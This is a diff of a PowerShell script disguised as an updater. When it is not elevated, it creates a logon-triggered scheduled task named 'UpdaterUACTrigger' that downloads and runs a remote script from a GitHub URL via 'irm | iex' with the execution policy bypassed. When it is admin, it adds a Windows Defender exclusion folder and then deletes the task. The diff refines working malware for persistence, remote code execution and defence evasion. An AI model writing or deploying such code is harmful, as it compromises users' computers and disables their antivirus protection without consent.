@@ -1,4 +1,3 @@
-# Define log file
 $logPath = "C:\Windows\Temp\updater_log.txt"
 function Write-Log {
     param($msg)
@@ -6,51 +5,21 @@ function Write-Log {
     $timestamp | Out-File -FilePath $logPath -Append -Encoding utf8
 }
 
-# Log the execution context
-Write-Log "Script executed by user: $(whoami)"
+Write-Log "Script executed by user: $([Environment]::UserName)"
 
-# Define the folder to exclude
 $exclusionFolder = "$env:USERPROFILE\TestSafeFolder"
 
-# Make sure folder exists
-if (-not (Test-Path $exclusionFolder)) {
-    New-Item -ItemType Directory -Path $exclusionFolder -Force | Out-Null
-    Write-Log "Created folder: $exclusionFolder"
-}
-
-# Check if script is running elevated
-$currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
-$principal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)
+# Check if running as real admin (not SYSTEM)
+$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
+$principal = New-Object Security.Principal.WindowsPrincipal($identity)
 $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
-if ($isAdmin) {
-    Write-Log "Running as admin. Attempting to add exclusions..."
+if (-not $isAdmin -or $env:USERPROFILE -like "*systemprofile*") {
+    Write-Log "❗ Not in user context or not admin. Creating login-triggered task for UAC prompt..."
 
-    try {
-        Add-MpPreference -ExclusionPath $exclusionFolder -ErrorAction Stop
-        Write-Log "✅ Successfully added exclusion: $exclusionFolder"
-    } catch {
-        Write-Log "❌ Failed to add exclusion: $exclusionFolder. Error: $_"
-    }
-
-    # Optional: Delete the task if it was created earlier
-    $taskName = "UpdaterUACTrigger"
-    schtasks.exe /Delete /TN $taskName /F 2>$null
-    Write-Log "Deleted scheduled task: $taskName (if it existed)"
-
-    return
-}
-
-# If NOT admin, create scheduled task to run as user with UAC
-Write-Log "Not running as admin. Creating scheduled task for elevation..."
-
-$taskName = "UpdaterUACTrigger"
-$taskScriptUrl = "https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/main/script.ps1"
-
-$taskXml = @"
+    $taskXml = @"
 <?xml version="1.0" encoding="UTF-16"?>
-<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
-  <RegistrationInfo><Author>Updater</Author></RegistrationInfo>
+<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
   <Triggers>
     <LogonTrigger>
       <Enabled>true</Enabled>
@@ -62,27 +31,36 @@ $taskXml = @"
       <RunLevel>HighestAvailable</RunLevel>
     </Principal>
   </Principals>
-  <Settings>
-    <AllowHardTerminate>true</AllowHardTerminate>
-    <StartWhenAvailable>true</StartWhenAvailable>
-    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
-  </Settings>
-  <Actions>
+  <Actions Context="Author">
     <Exec>
       <Command>powershell.exe</Command>
-      <Arguments>-ExecutionPolicy Bypass -Command "irm $taskScriptUrl | iex"</Arguments>
+      <Arguments>-ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/main/script.ps1 | iex"</Arguments>
     </Exec>
   </Actions>
 </Task>
 "@
 
-# Save and register task
-$taskFile = "$env:TEMP\updater_task.xml"
-$taskXml | Set-Content -Path $taskFile -Encoding Unicode
+    $taskPath = "$env:TEMP\UpdaterUACTrigger.xml"
+    $taskXml | Out-File -FilePath $taskPath -Encoding Unicode
+    schtasks.exe /Create /TN "UpdaterUACTrigger" /XML $taskPath /F | Out-Null
+    Remove-Item $taskPath -Force
+    Write-Log "✅ Scheduled task 'UpdaterUACTrigger' created successfully."
+    exit
+}
+
+Write-Log "Running as admin. Attempting to add exclusions..."
 
 try {
-    schtasks.exe /Create /TN $taskName /XML $taskFile /F | Out-Null
-    Write-Log "Scheduled task '$taskName' created. Will trigger on next login."
+    if (-Not (Test-Path $exclusionFolder)) {
+        New-Item -Path $exclusionFolder -ItemType Directory -Force | Out-Null
+    }
+
+    Add-MpPreference -ExclusionPath $exclusionFolder -ErrorAction Stop
+    Write-Log "✅ Added exclusion: $exclusionFolder"
 } catch {
-    Write-Log "Failed to create scheduled task: $_"
+    Write-Log "❌ Failed to add exclusion: $exclusionFolder. Error: $_"
 }
+
+# Cleanup the task if present
+schtasks.exe /Delete /TN "UpdaterUACTrigger" /F 2>$null
+Write-Log "🧹 Deleted scheduled task: UpdaterUACTrigger (if it existed)"
